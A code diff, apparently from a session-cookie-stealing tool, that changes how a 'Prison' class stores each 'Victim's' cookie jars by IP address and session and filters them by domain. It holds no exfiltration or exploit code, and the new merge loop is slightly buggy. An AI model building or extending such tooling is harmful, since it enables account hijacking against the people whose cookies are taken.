@@ -27,8 +27,10 @@ class Prison:
         if self._is_new_victim(victim):
             self.victims.append(victim)
         else:
-            print(
-                f"[-] Victim {victim.ip} already in data, skipping... (to be implemented)")
+            for existing_victim in self.victims:
+                if existing_victim.ip == victim.ip:
+                    break
+            existing_victim.cookies.update(victim.cookies)
 
     def get_victim(self, ip):
         for victim in self.victims:
@@ -44,9 +46,12 @@ class Prison:
     def from_domains(self, domains):
         result = {}
         for victim in self.victims:
-            cookies = victim.cookies.from_domains(domains)
-            if cookies:
-                result[victim.ip] = cookies
+            for (session, cookie_jar) in victim.cookies.items():
+                cookies = cookie_jar.from_domains(domains)
+                if cookies:
+                    if victim.ip not in result:
+                        result[victim.ip] = {}
+                    result[victim.ip][session] = cookies
         return result
 
 
@@ -79,11 +84,11 @@ class CookieJar:
 class Victim:
     def __init__(self, ip_address, date=datetime.now(timezone.utc)) -> None:
         self.ip = ip_address
-        self.cookies = None
         self.date = date
+        self.cookies = {}
 
     def get_date(self):
         return self.date.strftime("%d-%B-%Y (%H:%M:%S)")
 
-    def update_cookies(self, cookie_jar):
-        self.cookies = cookie_jar
+    def update_cookies(self, cookie_jar, session_number):
+        self.cookies[session_number] = cookie_jar
